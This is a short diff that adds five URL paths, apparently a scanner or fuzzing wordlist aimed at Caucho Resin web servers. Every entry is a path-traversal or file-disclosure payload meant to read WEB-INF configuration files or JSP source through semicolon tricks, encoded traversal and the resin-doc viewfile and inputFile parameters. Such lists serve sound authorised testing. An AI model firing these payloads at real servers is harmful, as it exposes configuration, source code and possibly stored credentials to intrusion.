@@ -1,0 +1,5 @@
+/;/WEB-INF/web.xml
+/resin-doc/;/WEB-INF/resin-web.xml
+/%20../web-inf/
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
+/resin-doc/viewfile/?file=index.jsp
